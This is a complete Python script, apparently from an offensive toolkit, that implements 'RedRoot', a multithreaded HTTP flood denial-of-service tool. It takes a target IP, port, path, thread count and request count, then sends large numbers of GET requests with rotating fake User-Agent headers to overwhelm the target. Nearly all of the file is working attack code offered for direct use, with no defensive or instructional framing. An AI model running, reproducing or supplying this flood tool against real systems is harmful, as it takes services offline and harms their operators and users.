# Copyright 2025 Agampreet Singh
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import argparse
import threading
import socket
import random
import time
import logging
from rich.console import Console
from rich.progress import Progress, BarColumn, TimeRemainingColumn

# Suppress warnings
logging.getLogger().setLevel(logging.ERROR)
console = Console()

# List of fake user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)..."
]

# RedRoot Banner
def redroot_banner():
    console.print("[bold red]\n   ⚔️  REDROOT-DOS ATTACK MODULE ⚔️\n[/bold red]")
    console.print("[bold blue]   Author:[/bold blue] ethicalhacker  |  [bold green]Mode:[/bold green] HTTP Flood")
    console.print("[bold magenta]   -------------------------------------------\n[/bold magenta]")

def http_flood(target_ip, target_port, path, request_count, progress, task_id):
    success = 0
    try:
        for _ in range(request_count):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))

            # Random User-Agent
            user_agent = random.choice(USER_AGENTS)
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Connection: keep-alive\r\n"
                "Accept: */*\r\n\r\n"
            )
            s.send(request.encode())
            s.close()
            success += 1
            progress.update(task_id, advance=1)
    except Exception:
        pass

def launch_http_attack(target_ip, target_port, path, threads, request_count):
    redroot_banner()
    console.print(f"[bold yellow][*] Launching attack on {target_ip}:{target_port}{path}[/bold yellow]")
    console.print(f"[bold cyan][*] Threads:[/bold cyan] {threads} | [bold cyan]Requests/thread:[/bold cyan] {request_count}\n")

    with Progress(
        "[progress.description]{task.description}",
        BarColumn(bar_width=None),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn(),
        transient=True,
    ) as progress:

        task_ids = []
        for i in range(threads):
            task = progress.add_task(f"[green]Thread-{i+1}", total=request_count)
            task_ids.append(task)

        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=http_flood, args=(target_ip, target_port, path, request_count, progress, task_ids[i]))
            thread_list.append(t)
            t.start()

        for t in thread_list:
            t.join()

    console.print(f"\n[bold green][✔] HTTP Flood Completed![/bold green]")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RedRoot HTTP Flood DoS Tool")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("--path", default="/", help="Target URL path (default: /)")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads (default: 20)")
    parser.add_argument("--requests", type=int, default=500, help="Requests per thread (default: 500)")
    args = parser.parse_args()

    launch_http_attack(args.target_ip, args.target_port, args.path, args.threads, args.requests)
